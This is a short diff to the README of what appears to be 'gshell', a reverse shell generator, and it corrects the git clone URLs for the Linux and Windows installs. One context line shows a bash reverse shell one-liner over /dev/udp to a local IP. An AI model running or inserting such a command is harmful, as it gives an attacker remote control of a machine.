@@ -171,7 +171,7 @@ bash -i >& /dev/udp/192.168.145.134/444 0>&1
 Clone or download the repository:
 
 ```sh
-git clone https://nozerobit.github.com/gshell
+git clone  https://github.com/nozerobit/gshell
 ```
 
 Install the requirements:
@@ -197,7 +197,7 @@ gshell.py
 Clone or download the repository:
 
 ```sh
-git clone https://nozerobit.github.com/gshell C:\\Tools
+git clone https://github.com/nozerobit/gshell C:\\Tools
 ```
 
 > Note: I created a directory named `Tools` in the `C:\` root directory.
